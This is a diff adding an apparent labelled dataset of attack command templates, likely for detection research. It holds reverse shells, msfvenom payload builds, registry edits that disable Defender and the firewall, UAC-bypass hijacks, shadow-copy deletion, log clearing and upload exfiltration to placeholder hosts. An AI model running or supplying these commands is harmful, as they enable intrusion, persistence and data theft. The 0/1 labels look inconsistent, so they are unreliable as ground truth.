@@ -1,0 +1,60 @@
+1	.\VGAuthService.exe ${VGAuthService.dll_path},VoidFunc
+1	schtasks /create /ru system /sc daily /tr "${command_to_execute}" /tn win32times /f
+1	sc create win32times binPath="${command_to_execute}"
+1	nc -c sh ${ip_address} ${port}
+1	nc ${ip_address} ${port} -e sh
+1	nc.exe ${ip_address} ${port} -e sh
+1	ncat ${ip_address} ${port} -e sh
+1	ncat.exe ${ip_address} ${port} -e sh
+1	curl -Ns telnet://${ip_address}:${port}
+1	rcat connect -s sh ${ip_address} ${port}
+1	telnet ${ip_address} ${port}
+1	nc -l ${ip_address} ${port}
+1	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+1	msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+1	msfvenom -p windows/x64/shell/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+1	msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+1	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f jsp -o reverse.jsp
+1	msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f elf -o reverse.elf
+1	msfvenom -p linux/x64/shell_reverse_tcp LHOST=${ip_address} LPORT=${port} -f elf -o reverse.elf
+1	msfvenom -p windows/meterpreter/reverse_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+1	msfvenom -p cmd/unix/reverse_bash HOST=${ip_address} LPORT=${port} -f raw -o reverse.sh
+1	reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v ${value_name} /t REG_DWORD /f /d ${value}
+1	reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v ${value_name} /t REG_DWORD /f /d ${value}
+1	reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v ${value_name} /t REG_DWORD /d ${value}
+1	reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v ${value_name} /t REG_DWORD /d ${value}
+1	reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v ${value_name} /t REG_DWORD /d ${value}
+1	reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v ${value_name} /t REG_DWORD /d ${value}
+1	reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile" /v ${value_name} /t REG_DWORD /d ${value}
+1	reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" /v ${value_name} /t REG_DWORD /d ${value}
+1	reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v ${value_name} /t REG_DWORD /d ${value}
+0	reg add hkcu\software\classes\ms-settings\shell\open\command /ve /d "${command_to_execute}" /f && reg add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
+0	cmd.exe /c "plink.exe ${username}@${ip_address} -pw ${password} -2 -4 -T -N -C -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
+0	curl ${source_file_path} -o $ ${destination_file_path}
+0	tar -cvf archive.tar ${source_directory}
+0	choco install putty
+0	red add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /V "Atomic Red Team" /t REG_SZ /f /d "${command_to_execute}"
+0	mail -s ${email_subject} ${username}@${domain} < mail.txt
+0	rar a archive.rar ${source_directory}
+0	echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} -a attachement.txt
+0	powershell -c "vssadmin.exe delete shadows /all /quiet"
+0	powershell -c "sc.exe stop ${service_name}"
+0	wevtutil cl ${log_name}
+0	echo Username: %USERNAME%
+0	New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force; Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "${command_to_execute}" -Force
+0	cmd.exe /c "net.exe stop ${service_name}"
+0	msfvenom -p windows/meterpreter/reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+0	copy ${source_file_path} ${destination_file_path}
+0	reg add hkcu\software\classes\ms-settings\shell\open\command /ve /d "${command_to_execute}" /f && reg add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
+0	sc.exe start ${service_name}
+0	powershell -c "curl ${source_file_path} -o $ ${destination_file_path}"
+0	wget https://${ip_address}/${destination_file_path}
+0	cmdkey /list
+0	whoami /all
+0	get-localgroup
+0	curl -X POST --upload-file ${source_file_path} http://${ip_address}:${port}/upload
+0	query user
+0	powershell -c "psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute} -s"
+0	xcopy ${source_file_path} ${destination_file_path}
+0	zip -r archive.zip ${source_directory}
+0	New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force; Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "${command_to_execute}" -Force
